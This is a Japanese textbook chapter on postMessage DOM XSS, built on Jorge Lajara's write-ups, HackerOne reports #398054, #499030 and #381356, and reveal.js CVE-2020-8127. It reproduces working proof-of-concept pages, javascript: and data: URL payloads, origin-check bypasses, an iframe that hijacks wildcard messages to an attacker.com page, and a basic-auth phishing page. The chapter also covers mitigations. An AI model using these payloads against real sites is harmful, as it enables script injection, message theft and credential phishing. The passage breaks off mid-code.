# postMessage の DOM XSS を狩る — Jorge Lajara「PostMessage Vulnerabilities」Part I / II 精読

> **この節で分かること**
> - `window.postMessage()` がなぜ存在し、どう動くのか、そしてどこに穴が空くのかを説明できる。
> - 原典 Part I のデモ（1.html / 2.html / 3.html）を読み解き、origin 未検証の受信ハンドラが `<a href>` に流れて XSS になる仕組みを再現できる。
> - `indexOf` / `search` / `match` などの「雑な origin チェック」がなぜ破れるのか、具体的なバイパス式を挙げて説明できる。
> - 実在の HackerOne レポート（#398054 Marketo、その修正のバイパス #499030、Frans Rosén の #381356）と reveal.js の CVE-2020-8127 を、脆弱コードのレベルで追える。
> - `window.addEventListener('message', ...)` を起点にリスナーを列挙し、sink まで人手でデータフローを追う検出手順を自分で実行できる。
> - postMessage 脆弱性を厳密等価の origin 検証とペイロードのスキーマ・スキーム検証でどう塞ぐかを説明できる。

**元資料**: https://jlajara.gitlab.io/Dom_XSS_PostMessage （Part I）／ https://jlajara.gitlab.io/Dom_XSS_PostMessage_2 （Part II）（**原典は取得できず二次情報ベース**。原典 2 本は本教科書の執筆環境から egress ポリシーで 403 拒否となり直接取得できなかった。記述は、jlajara Part I/II を忠実に再現した anquanke.com 記事＝逐語入手、HackTricks の逐語、および jlajara が扱った一次ソース＝HackerOne #398054 / #381356 と reveal.js 3.9.1 の GitHub 逐語にもとづく。）
**関連する節**: DOM-based XSS の基礎、同一オリジンポリシーと iframe、CSP の節

---

## 1. postMessage とは何か — なぜこの API が生まれたのか

### 1.1 別オリジンのウィンドウ同士を「安全に」話させたい

同一オリジンポリシー（Same-Origin Policy, SOP）とは、あるオリジン（スキーム＋ホスト＋ポートの組）で読み込まれたスクリプトが、別オリジンのウィンドウやドキュメントの中身へ勝手に触れないようにするブラウザの基本ルールのこと。これによって、たとえば攻撃者のページが別タブで開いた銀行サイトの DOM を直接読むことはできない。

しかし現実には「別オリジン同士で通信したい」正当な場面がある。たとえば親ページと、その中に埋め込んだ iframe（別オリジンのウィジェット）や、親ページが `window.open()` で開いたポップアップとの間だ。この「クロスオリジン通信を安全に行うための出入口」として用意されたのが `window.postMessage()` である。`postMessage` とは、ウィンドウ（Window オブジェクト）間でメッセージ文字列を送り合うための API のこと。たとえば、埋め込みフォームが「送信完了しました」と親ページに知らせる、といった用途で使う。

### 1.2 正しく使えば安全、誤ると情報漏洩か DOM XSS

原典 Part I の冒頭は、postMessage が正しく実装されていない場合に **情報漏洩** または **DOM-based XSS**（受信データが危険な場所に流れてスクリプト実行に至るクライアントサイドの XSS）につながりうる、と主題を置く。Part I は「postMessage とは何か・基本的な悪用・検出・緩和」への導入、Part II は実戦ケースの解析、という二部構成である。

### 1.3 送信 API のシグネチャと受信ハンドラ

送信側の API シグネチャは次のとおり。

```javascript
targetWindow.postMessage(message, targetOrigin, [transfer]);
```

`targetWindow` は送り先のウィンドウ参照（`iframe.contentWindow` や `window.open()` の戻り値など）、`message` は送るデータ、`targetOrigin` は「送り先が今このオリジンである時だけ配送してよい」という制約、である。

受信側は次の形でハンドラを登録する。

```javascript
window.addEventListener("message", handler);
```

ハンドラに渡る `MessageEvent` は主に 3 つのプロパティを持つ。

| プロパティ | 意味 |
|---|---|
| `event.data` | 送られてきたペイロード本体（JSON 文字列のことが多い） |
| `event.origin` | 送信元のオリジン文字列（例: `https://example.com`） |
| `event.source` | 送信元の Window への参照 |

脆弱性の本質は一文で言える。**「受信側が `event.origin` を検証せず、`event.data` を危険なsink（`eval`、`innerHTML`、`location` / `location.href`、`<a>.href`、`document.write`、`Function`、文字列を渡す `setTimeout` など）にそのまま流す」** ことだ。sink とは、そこにデータを渡すとスクリプト実行やナビゲーションが起こる「危険な出口」のこと。

---

## 2. 送信 targetOrigin の非対称性 — 情報漏洩の根源

### 2.1 送信のさまざまなパターン

以下は HackTricks（jlajara の技法を再現した二次資料）の逐語で、jlajara Part I が示す送信イディオムと同一である。

```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to a URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```

### 2.2 `'*'` と厳密オリジンの違い

`targetOrigin` は `'*'`（ワイルドカード）か `https://company.com` のような厳密オリジンを指定できる。厳密オリジンにした場合、送信先 Window が現在そのオリジンを持つ時だけブラウザがメッセージを配送する。`'*'` の場合は送信先 Window の現在のオリジンに関係なく配送される、つまり任意ドメインに届きうる。

この非対称性が重要だ。機微なメッセージを `'*'` で送るページを iframe 化し、その iframe の中身を後から攻撃者ドメインにすり替えれば、本来届くはずのないメッセージを攻撃者が受け取れる（後述の情報漏洩）。**送信側のワイルドカードは、受信側の origin 欠如と同じくらい危険**である。

---

## 3. 基本の脆弱パターン — Part I の 1.html / 2.html / 3.html

原典 Part I のシナリオはこうだ。メインサイト `1.html` が `2.html` と通信する。`2.html` には「戻るボタン（back button）」があり、`1.html` のナビゲーションが変わるとこのボタンの参照先も変わる。この連動を `postMessage` で `1.html` から `2.html` へ URL を送って実現している。

以下は jlajara Part I を忠実に再現した anquanke.com 記事から確定した逐語コードである（出典は jlajara 本人の英語原文ではなく中国語再現記事だが、変数名・構造まで原典と一致する）。

### 3.1 1.html（送信側・逐語）

「Open child」で `2.html` をポップアップし、「Send Message」で `{url:"changed.html"}` をワイルドカード `*` で送る。

```html
<!DOCTYPE html>
<html>
<head>
    <title>Website 1</title>
 <meta charset="utf-8" />
<script>

var child;
function openChild() {child = window.open('2.html', 'popup', 'height=300px, width=500px');

}
function sendMessage(){
    let msg={url : "changed.html"};
    // In production, DO NOT use '*', use toe target domain
    child.postMessage(msg,'*')// child is the targetWindow
    child.focus();
}</script>
</head>
<body>
    <form>
        <fieldset>
            <input type='button' id='btnopen' value='Open child' onclick='openChild();' />
            <input type='button' id='btnSendMsg' value='Send Message' onclick='sendMessage();' />
        </fieldset>
    </form>
</body>
</html>
```

コメント `// In production, DO NOT use '*'` が付いているのに、デモでは `'*'` を使っている点に注目してほしい。

### 3.2 2.html（脆弱な受信側・逐語）

`event.origin` を検証せず（コメントで「Normally you would check event.origin」と書いてあるだけで**実際には検証していない**）、`event.data.url` をテンプレートリテラルで `<a id="redirection">`（「Go back」リンク）の `href` に代入する。ここが sink だ。

```html
<!DOCTYPE html>
<html>
<head>
    <title>Website 2</title>
    <meta charset="utf-8" />
    <script>
    // Allow window to listen for a postMessage
    window.addEventListener("message", (event)=>{
        // Normally you would check event.origin
        // To verify the targetOrigin matches
        // this window's domain
         document.getElementById("redirection").href=`${event.data.url}`;
        // event.data contains the message sent

    });function closeMe() {
        try {window.close();
        } catch (e) { console.log(e) }
        try {self.close();
        } catch (e) { console.log(e) }}
    </script>
</head>
<body>
    <form>
        <h1>Recipient of postMessage</h1>
            <fieldset>
                <a type='text' id='redirection' href=''>Go back</a>
                <input type='button' id='btnCloseMe' value='Close me' onclick='closeMe();' />
            </fieldset>

    </form>
</body>
</html>
```

### 3.3 3.html（攻撃側・逐語）

攻撃者は `2.html` を iframe として読み込み、`contentWindow.postMessage()` で `{url:"javascript:prompt(1)"}` を送る。`2.html` はこれを `<a href>` に代入するので、ユーザーが「Go back」をクリックすると `javascript:` URI が発火して XSS になる。

```html
<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
 <meta charset="utf-8" />


</head>
<body>

 <iframe id="frame" src="2.html" ></iframe>

 <script>

    let msg={url : "javascript:prompt(1)"};
    var iFrame = document.getElementById("frame")
    iFrame.contentWindow.postMessage(msg, '*');

</script>
</body>
</html>
```

### 3.4 ここから学ぶ 2 つの原理

- sink が `<a href>` の場合、`javascript:` スキームは「リンククリック」というユーザー操作を 1 回要する（自動発火ではない）。sink が `location.href` / `location` への直接代入なら操作不要で即ナビゲーション、つまり即発火になりうる。
- iframe 化できること（`X-Frame-Options` や CSP の `frame-ancestors` が無い、または緩い）が前提になる。iframe 化できない場合は `window.open()`＋`postMessage`（別タブ／別ウィンドウ）に切り替える（第 7 節）。

### 3.5 原典 Part I の直し方（逐語）

原典は MDN を引き、具体的な修正として次を示す。

- `1.html` の `child.postMessage(msg,'*')` を `child.postMessage(msg,'2.html')`（ワイルドカードを厳密 targetOrigin に）へ。
- `2.html` の受信ハンドラ冒頭に origin 検証を追加する。

```javascript
window.addEventListener("message", (event)=>{
    if (event.origin !== "http://safe.com")
    return;
    ...
});
```

> ### 📌 ここは自分で開いて読んでください
> **資料**: PostMessage Vulnerabilities. Part I — https://jlajara.gitlab.io/Dom_XSS_PostMessage
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の egress 制限で `jlajara.gitlab.io` 全体が 403）。以下の記述は、jlajara Part I を忠実に再現した二次記事（anquanke.com）と検索スニペットにもとづく要約である。
> **読みどころ**:
> 1. postMessage の定義（親↔ポップアップ、親↔iframe のクロスオリジン通信 API という位置づけ）と、誤用が情報漏洩／XSS になる理由。
> 2. 1.html / 2.html / 3.html の逐語デモコード。特に `2.html` が origin 未検証で受信データを `<a href>`（「Go back」リンク）に代入する箇所と、`3.html` が iframe + `postMessage({url:"javascript:prompt(1)"})` で発火させる箇所。
> 3. 検出手法の節（`window.addEventListener` / `$(window).on` の grep、`getEventListeners(window)`、DevTools Event Listeners）。
> 4. 緩和の節（origin / source 検証と受信メッセージの構文検証）。
> 5. 記事末尾の Part II への導線。
> **代替手段**: anquanke.com「通过HackerOne漏洞报告学习PostMessage漏洞实战场景中的利用与绕过」 https://www.anquanke.com/post/id/219088 （中国語だが 1/2/3.html を逐語掲載）

---

## 4. リスナーの列挙 — postMessage 脆弱性の検出

### 4.1 「JS を読む」以外に王道は無い

原典 Part I は明言する。「postMessage 脆弱性の検出は JavaScript コードを読むことに尽きる。リスナー定義からイベントのデータフローを追い、攻撃されやすい関数（sink）で終わるかを解析する」。これを助ける簡単な自動ツールは存在しない。

### 4.2 リスナーの見つけ方（HackTricks 逐語）

典型的なリスナーは次の形をとる。ハンドラが最初に送信元オリジンをチェックしているかどうかを見るのが最重要ポイントだ。

```javascript
window.addEventListener(
  "message",
  (event) => {
    if (event.origin !== "http://example.org:8080") return

    // ...
  },
  false
)
```

列挙（Enumeration）の具体手段は次のとおり。

- JS コードを `window.addEventListener` および `$(window).on`（JQuery 版）で検索する。
- DevTools コンソールで実行する: `getEventListeners(window)`
- ブラウザ DevTools の Elements → Event Listeners を見る。
- ブラウザ拡張 Posta（https://github.com/benso-io/posta ）や postMessage-tracker（https://github.com/fransr/postMessage-tracker ）を使う。これらは全メッセージを傍受して表示する。

### 4.3 原典 Part I が挙げる検出ツール

原典 Part I が具体的に挙げる検出ツールは次の 2 つである（HackTricks が挙げる posta / postMessage-tracker とは別系統）。

- **J2EEScan**（Burp 拡張。GitHub https://github.com/ilmila/J2EEScan の最新版を使う）
- **BurpBounty**（https://github.com/wagiro/BurpBounty 。`postMessage`、`addEventListener("message`、`.on("message"` などのキーワードを受動的に検索する応答文字列ルールを定義して使う）

---

## 5. origin チェックのバイパス — 雑な検証はこう破れる

受信側が origin 検証を「文字列メソッド」で雑に実装していると容易にバイパスできる。以下は HackTricks の逐語である。

### 5.1 `event.isTrusted` を認可に使ってはいけない

`event.isTrusted` は「ブラウザがそのイベントをディスパッチしたか（JS の `dispatchEvent` ではないか）」を示すだけで、`MessageEvent` が信頼できるオリジンや真のユーザー操作から来たことを証明しない。認可には `event.origin`（必要に応じ `event.source`）を検証すること。

### 5.2 `indexOf()` は前方一致「含む」しか見ない

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

このように部分文字列を含むかだけを見ているため、攻撃者ドメインを部分文字列として満たせる。

### 5.3 `search()` と `match()` は正規表現になる

`String.prototype.search()` は正規表現を取る。文字列を渡すと暗黙に正規表現へ変換され、正規表現では **ドット（`.`）が任意 1 文字のワイルドカード** になるため、特別なドメインで検証をすり抜けられる。

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

`match()` も `search()` 同様に正規表現を処理するため、正規表現の組み方が不適切だとバイパスされうる。

### 5.4 `escapeHtml` の欠陥

この種の関数は新しいエスケープ済みオブジェクトを作らず、既存オブジェクトのプロパティを上書きする実装がある。そのため `hasOwnProperty` に応答しない制御可能プロパティを持つオブジェクトを作れると、エスケープが効かない。

期待される失敗（正しくエスケープされる例）:

```javascript
result = u({
  message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

バイパス（エスケープが効かない例）:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

`File` オブジェクトはこの悪用に最適で、読み取り専用の `name` プロパティがテンプレートで使われる際に `escapeHtml` を回避する。なお `document.domain` プロパティはスクリプトで短縮設定でき、同一親ドメイン内での SOP を緩められる点も覚えておきたい。

### 5.5 スキーム部分文字列チェックの回避

受信側が `event.origin` を検証せず、`event.data` が `http:` / `https:` を **含むか** だけを見て `location.href` に代入する場合、部分文字列チェックは実際の URL スキームを制約しない。値の先頭を `javascript:` にして、必要な部分文字列を JS の行コメント `//` の後ろに置けば、ブラウザは受信側オリジンで先頭の JavaScript URL を実行する。

```html
<iframe
  src="https://target.example/"
  onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
</iframe>
```

ここで `http:` は `indexOf('http:') > -1` フィルタを満たすが、`//` 以降はコメントとして無視される。悪用には (1) 対象 Window への参照（iframe 可能ページかポップアップ）、(2) 到達可能なリスナー、(3) `javascript:` URL を許すナビゲーション sink、が必要だ。

### 5.6 信頼オリジンのリレーを踏み台にする

受信側が `event.origin` だけを見て `*.trusted.com` を無条件信頼する場合、その信頼オリジン上に「攻撃者制御のパラメータを `postMessage` でエコーするリレーページ」を見つけられることが多い。手口はこうだ。

- opener を持たせて被害ページをポップアップ／iframe で開く（多くの pixel / SDK は `window.opener` があるときだけリスナーを登録する）。
- 別の攻撃者ウィンドウを信頼オリジン上のリレー endpoint へ遷移させ、注入したいメッセージフィールド（type, token, nonce）を埋める。
- メッセージが信頼オリジン発になるため origin-only 検証を通り、被害リスナーで特権動作を起動できる。

ハンティングのコツ: `event.origin` だけを見るリスナーを列挙し、同一オリジンの HTML/JS endpoint で URL パラメータを `postMessage` に転送するもの（マーケプレビュー、ログインポップアップ、OAuth エラーページ）を探し、`window.open()`＋`postMessage` で両者を繋いで origin チェックを回避する。

---

## 6. origin 検証そのものを無効化する 3 つの技

### 6.1 null origin バイパス（`e.origin == window.origin`）

`<iframe sandbox="allow-scripts" src="...">` のようなサンドボックス iframe に埋め込むと、その iframe の origin は `null` になる。sandbox に `allow-popups` を指定すると、iframe から開いたポップアップは親のサンドボックス制約を継承する（`allow-popups-to-escape-sandbox` を追加しない限り）。よって null origin の iframe から開いたポップアップの `window.origin` も `null` になる。

結果として、popups を許すサンドボックス iframe を開き、その中からポップアップを開き、iframe からポップアップへ `postMessage` を送ると、送信側・受信側の両 origin が `null` になる。したがって `e.origin == window.origin == null`（`null == null` が true）となり、`e.origin == window.origin` という等価チェックを突破できる。

### 6.2 `e.source` バイパス

同じウィンドウ由来かをチェックするコード（ブラウザ拡張の Content Script などで有用）は次の形をとる。

```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
  return
}
```

`e.source` を null に強制するには、`postMessage` を送信する iframe を作って**即座に削除**すればよい。削除で送信元 Window 参照が失われ、`e.source` が null になる。

### 6.3 送信ワイルドカードによる情報漏洩

iframe 化可能（`X-Frame-Options` 保護なし）で、機微なメッセージをワイルドカード `*` で `postMessage` しているページは、iframe の origin を変更して機微メッセージを攻撃者ドメインに漏洩できる。targetOrigin が URL（非ワイルドカード）に設定されているなら、この手は効かない。

```html
<html>
   <iframe src="https://docs.google.com/document/ID" />
   <script>
      setTimeout(exp, 6000); //Wait 6s

      //Try to change the origin of the iframe each 100ms
      function exp(){
          setInterval(function(){
              window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
          }, 100);
      }
   </script>
```

---

## 7. フレーミング保護（X-Frame）のバイパス

これらの攻撃は理想的には被害ページを iframe に入れて行うが、`X-Frame-Options` や CSP の `frame-ancestors` が阻む。その場合は、より目立つが有効な手として、新しいタブ／ウィンドウで対象を開いて通信する。

```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```

関連手法（HackTricks が別ページとして扱うもの・名称のみ）:

- **Stealing message sent to child by blocking the main page**: メインページを送信前にブロックし、子 iframe 内の XSS で受信前にデータを奪う。
- **Stealing message by modifying iframe location**: X-Frame 無しのページ内の子 iframe の location を攻撃者ページに変更し、ワイルドカード送信のメッセージを横取りする。

なお、`postMessage` で送られたデータが JS で実行されるシナリオでは、ページを iframe 化して prototype pollution → XSS の exploit を送り込める。HackTricks は「非常によく解説された postMessage 経由 XSS」として jlajara Part II を明示的に挙げている。

---

## 8. Part II Case 1 — HackerOne #398054 Marketo forms2.js

ここからは Part II の実戦ケースだ。jlajara Part II が Case 1 として解説している実レポート #398054（報告者 adac95、対象 www.hackerone.com、Bounty $500、報告 2018-08-22 / 開示 2019-02-21、Weakness: XSS-DOM）の全文を GitHub ミラーから逐語入手した。

### 8.1 仕組み

www.hackerone.com のコンタクトフォームは Marketo を使い、hackerone.com ウィンドウと埋め込み Marketo iframe の間の message イベントで実装される。`submit` でフォームデータが Marketo iframe に送られ、完了後 Marketo iframe が成否をメッセージで返す。hackerone.com 側のハンドラは次のとおり。

```javascript
$(window).on("message", onMessage);
function onMessage (e){
  if(e.originalEvent && e.originalEvent.data){
    var d;
    try {
      d = $.parseJSON(e.originalEvent.data);
    }catch(ex){
      return;
    }
    if(d.mktoReady){
      onReady();
    }else if(d.mktoResponse){
      onResponse(d.mktoResponse)   
    }
  }
}
```

リスナーは JQuery で登録され、データを文字列→オブジェクトにパースし、`mktoReady` か `mktoResponse` を見る。**origin チェックが一切ない**のが脆弱点だ。`mktoResponse` があれば `onResponse` に渡す。

```javascript
function onResponse(mktoResponse){
  var requestId = mktoResponse["for"];
  var request = inflight[requestId];
  if(request){
    if(mktoResponse.error){
      request.error(mktoResponse.data);
    }else{
      request.success(mktoResponse.data);
    }
  }
  delete inflight[requestId];
}
```

`error` プロパティが無ければ `success` が `data` 引数で呼ばれる。

```javascript
var success = function (data){
  if(data.error){
    onError(data);
  }else if(data.formId){
    var u = findCorrectFollowUpUrl(data);
    if(false === onSuccess(values, u)){
      return;
    }
    cookieHelper.removeCookieAllDomains("_mkto_purl");
    location.href = u;
  }
}
```

`u` は `findCorrectFollowUpUrl(data)` の戻り値で、レスポンスの `followUpUrl`（送信完了後のリダイレクト先）を処理する。これを絶対 URL に制御すると `u` を操れ、それが `location.href` に代入される。次のメッセージを送れば `javascript:` URI に遷移し `alert(document.domain)` が実行される（sink: `location.href = u`）。

```javascript
{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"javascript:alert(document.domain);//","aliId":17144124}}}
```

### 8.2 現実的な制約

1. `javascript:` URI へのリダイレクトはインライン JS 実行と等価とみなされ、HackerOne の **CSP** にブロックされた。CSP 非対応ブラウザ（IE11 等）なら本来悪用可能だが、サイトが `includes` 関数（IE11 非対応）を使いエラーになった。

```javascript
SCRIPT438: Object doesn't support property or method 'includes'
js_gSD6OxivXJVJaZwXxHUQz15yz9xczqXghcBxuRO0Ieo.js (43,5)
```

2. ユーザーが先に攻撃者サイトを訪れコンタクトフォームを送信する必要がある（`inflight` に success/error を積むため）。
3. Firefox で CSP を Burp の match & replace（レスポンスヘッダの `^Content-Security-Policy: .*$` 除去）で無効化すると実行できた。PoC は `setInterval` で 250ms ごとに `mktoResponse` を送り、正規メッセージより先に success を処理させるレースだった。

### 8.3 CSP を触らないフィッシング亜種

CSP を回避できなくても、basic 認証プロンプトを重ねるフィッシングに転用できる。

```javascript
{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"https://attacker.sometld/401.php","aliId":17144124}}}
```

```php
<?php
header('WWW-Authenticate: Basic realm="Log in to HackerOne"');
header('HTTP/1.0 401 Unauthorized');
?>
```

Firefox / Microsoft Edge では認証プロンプト表示中も背景に www.hackerone.com が見えるため、別アプリの認証と気づかれにくい。修正提案（原文）は、リスナーで全メッセージが信頼オリジン（marketo.com のサブドメイン等）から来たかをチェックし、加えて `followUpUrl` を HTTP/HTTPS URL に限定検証して `javascript:` を防ぐこと。

---

## 9. その修正を破る #499030 — indexOf の「向き」ミス

jlajara Part II は #398054 だけでなく、その修正が施された後のバイパス報告 #499030 まで解説している。#398054 提出後に入れられた修正は次のとおり（anquanke.com 再現記事・逐語）。`onMessage` に origin 検証を追加している。

```javascript
if (a.originalEvent && a.originalEvent.data && 0 === i.indexOf(a.originalEvent.origin)) {
    var b;
    try {
        b = j.parseJSON(a.originalEvent.data)
    } catch (c) {
        return
    }
    b.mktoReady ? f() : b.mktoResponse && e(b.mktoResponse)
}
```

ここで `i` は `https://app-sj17.marketo.com/` に解決される。追加された条件 `0 === i.indexOf(a.originalEvent.origin)` は「`i`（信頼オリジン文字列）が、受信した `origin` を**先頭に含む**か」を見ている。**検証方向が逆**で、受信 origin が信頼オリジンの「接頭辞」でありさえすれば通ってしまう。

そこで攻撃者は `.ma`（モロッコ）ドメイン `app-sj17.ma` を登録すればよい。

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")   // === 0（先頭一致）
```

これが `0` を返し条件を満たすので、#398054 の攻撃コードを `https://app-sj17.ma` 配下にホストすれば修正後も XSS が成立する。教訓は明確だ。origin 検証を `indexOf`（しかも誤った向き）で書くと、攻撃者が信頼オリジンの前方部分文字列に一致するドメインを取得するだけで破れる。正しくは `event.origin === "https://app-sj17.marketo.com"` の**厳密等価**、または正しくパースした URL origin の比較で行う。

---

## 10. 関連ケース — #381356 Frans Rosén: Safari の data: を突くレース

#398054 と同じ Marketo listener を突く関連一次レポート（報告者 fransrosen、対象 www.hackerone.com、報告 2018-07-13 / 開示 2019-04-05、Weakness: Business Logic Errors）だ。受信側で origin チェックが無い点は共通で、こちらは Client-Side Race Condition が主題である。

フォーム送信の成功時、`onSuccess` が `false` を返せば何も起きないが、`onSuccess` が存在しないか `true` を返すと `followUpUrl` が `location.href` に送られ、その中身は一切検証されない。

```js
      form.onSuccess(function() {
        return false;
      }); 
```

Marketo フローは、フォーム送信でリスナー起動 → Marketo へ postMessage → Marketo が保存 → 成功時 Marketo から status を postMessage → リスナーが `onSuccess` を確認、という流れ。origin チェックが無いので、リスナー起動と正規応答の間に自分のメッセージをレースさせる。www.hackerone.com 上で `mktoForm_1013` は `onSuccess` を持たず、`#contact` フラグメントで無操作でフォームが開く。

CSP により `javascript:` は不可、Chrome/Firefox は `data:` へのトップナビゲーションも禁止。しかし **Safari（macOS 10.13.5, Safari 11.1.1）は `data:` へのトップナビゲーションを制限しない**。これを利用する。

```html
<html>
<head>
<script>
var b;
function doit() {
	setInterval(function() {
		b.postMessage('{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"data:text/html;base64,PGhlYWQ+PGxpbmsgcmVsPXN0eWxlc2hlZXQgbWVkaWE9YWxsIGhyZWY9aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2Fzc2V0cy9mcm9udGVuZC4wMjAwMjhlOTU1YTg5Zjg1YTVmYzUyMWVhYzMxMDM2OC5jc3MgLz48bGluayByZWw9c3R5bGVzaGVldCBtZWRpYT1hbGwgaHJlZj1odHRwczovL2hhY2tlcm9uZS5jb20vYXNzZXRzL3ZlbmRvci1iZmRlMjkzYTUwOTEzYTA5NWQ4Y2RlOTcwZWE1YzFlNGEzNTI0M2NjNzY3NWI2Mjg2YTJmM2Y3MDI2ZmY1ZTEwLmNzcz48L2hlYWQ+PGJvZHk+..." ,"aliId":null}}}','*');
console.log('send...')
	}, 10);
}
</script>
</head>
<body>
<a href="#" onclick="b=window.open('https://www.hackerone.com/product/response#contact','b','_blank'); doit(); return false;" target="_blank">Click me and send something</a></body>
</html>
```

`followUpUrl` の base64 は www.hackerone.com のサインインページを完全再現した data: URL で、偽サインインフォームが `onsubmit` で入力を窃取する。`setInterval(...,10)` で 10ms ごとに送り正規応答にレース勝ちする。Safari は新規タブだと非アクティブ扱いで postMessage が遅くなるため、`window.open(url,'','_blank')` で完全な新規ウィンドウを開くと勝率が上がる。緩和（原文）は `onSuccess=function(){return false}` を常に設定して `followUpUrl` を使わせないこと。

> ### 📌 ここは自分で開いて読んでください
> **資料**: PostMessage Vulnerabilities. Part II — https://jlajara.gitlab.io/Dom_XSS_PostMessage_2
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の egress 制限で 403）。以下の記述は、一次レポート（#398054 / #381356）と reveal.js 3.9.1 の逐語、および anquanke.com 再現記事にもとづく要約である。
> **読みどころ**:
> 1. HackerOne #398054（Marketo forms2.js）ケースの jlajara 独自解説（どの行を sink / origin 欠如と指摘し、どう再現手順を組み立てたか）。
> 2. reveal.js（CVE-2020-8127）ケースの jlajara 独自解説（どの `Reveal[method]` を呼んで XSS に到達させたか）。
> 3. origin チェックのバイパス実例（`indexOf` / `search` の弱い実装をどう破るか）。
> 4. CSP による制限とその回避／フィッシング亜種（`javascript:` が CSP で止まる話、Safari の `data:` 挙動など）。
> 5. jlajara がまとめたチェックリスト／緩和策の最終節。
> **代替手段**: anquanke.com https://www.anquanke.com/post/id/219088 （#398054・#499030・reveal.js を同じ構成で解説）

---

## 11. Part II Case 2 — reveal.js CVE-2020-8127

jlajara Part II が Case 2 として扱う reveal.js の postMessage 脆弱性で、脆弱バージョン 3.9.1 の `js/reveal.js` から逐語入手した。CVE-2020-8127（reveal.js < 3.9.2 の postMessage による XSS / 任意 API 呼び出し）に対応する。

### 11.1 任意メソッド呼び出しの入口

```javascript
	function setupPostMessage() {

		if( config.postMessage ) {
			window.addEventListener( 'message', function ( event ) {
				var data = event.data;

				// Make sure we're dealing with JSON
				if( typeof data === 'string' && data.charAt( 0 ) === '{' && data.charAt( data.length - 1 ) === '}' ) {
					data = JSON.parse( data );

					// Check if the requested method can be found
					if( data.method && typeof Reveal[data.method] === 'function' ) {
						var result = Reveal[data.method].apply( Reveal, data.args );

						// Dispatch a postMessage event with the returned value from
						// our method invocation for getter functions
						dispatchPostMessage( 'callback', { method: data.method, result: result } );
					}
				}
			}, false );
		}

	}
```

`config.postMessage` が有効なとき、リスナーは `event.origin` を一切検証しない。受信データが `{...}` の JSON 文字列であることだけ確認し、`data.method` が `Reveal` 上の関数名なら `Reveal[data.method].apply(Reveal, data.args)` で任意の Reveal API を任意引数で呼び出せる。つまり攻撃者は reveal.js ページを iframe / ポップアップに読み込み、`postMessage('{"method":"<任意メソッド>","args":[...]}', '*')` を送るだけでよい。

### 11.2 実際の XSS 発火チェーン（報告 #691977）

任意メソッド呼び出しから実際の XSS に化ける鍵は「`addKeyBinding` で未サニタイズの `description` を登録 → `showHelp()` がそれを `innerHTML` に連結する」二段構えだ。

まず `{"method":"addKeyBinding","args":[ <binding>, <callback> ]}` を送る。`addKeyBinding` は `binding.keyCode` があると `description` を無検証で格納する。

```javascript
	function addKeyBinding( binding, callback ) {

		if( typeof binding === 'object' && binding.keyCode ) {
			registeredKeyBindings[binding.keyCode] = {
				callback: callback,
				key: binding.key,
				description: binding.description
			};
		}
		else {
			registeredKeyBindings[binding] = {
				callback: callback,
				key: null,
				description: null
			};
		}

	}
```

`description` に `<img src=x onerror=...>` 等を仕込める。次に `{"method":"toggleHelp"}`（または `showHelp`）を送ってヘルプ画面を開かせる。`showHelp()` は `description` をエスケープせず `html` に連結し、最後に `dom.overlay.innerHTML` に代入する。ここが sink だ。

```javascript
	function showHelp() {
		if( config.help ) {
			...
			var html = '<p class="title">Keyboard Shortcuts</p><br/>';
			html += '<table><th>KEY</th><th>ACTION</th>';
			for( var key in keyboardShortcuts ) {
				html += '<tr><td>' + key + '</td><td>' + keyboardShortcuts[ key ] + '</td></tr>';
			}
			// Add custom key bindings that have associated descriptions
			for( var binding in registeredKeyBindings ) {
				if( registeredKeyBindings[binding].key && registeredKeyBindings[binding].description ) {
					// ↓ description を無サニタイズで innerHTML に連結（XSS sink）
					html += '<tr><td>' + registeredKeyBindings[binding].key + '</td><td>' + registeredKeyBindings[binding].description + '</td></tr>';
				}
			}
			html += '</table>';
			dom.overlay.innerHTML = [               // ← ここで innerHTML に投入
				'<header>',
					'<a class="close" href="#"><span class="icon"></span></a>',
				'</header>',
				'<div class="viewport">',
					'<div class="viewport-inner">'+ html +'</div>',
				'</div>'
			].join('');
			...
		}
	}
```

つまり「任意 `Reveal[method]` を呼べる」ことが、`addKeyBinding`（description 無検証格納）＋ `showHelp/toggleHelp`（description を innerHTML へ）の組み合わせで実際の DOM XSS になる。攻撃者は `addKeyBinding` メッセージ → `toggleHelp` メッセージの順に送るだけでよい（いずれも origin 未検証で受理される）。

### 11.3 修正版の方向性

〔補足〕修正版（3.9.2 以降）では、postMessage 経由で呼べないメソッドのブラックリストを導入している（後継コードから確認・逐語。原典 jlajara の逐語ではない）。

```javascript
// Methods that may not be invoked via the postMessage API
export const POST_MESSAGE_METHOD_BLACKLIST =
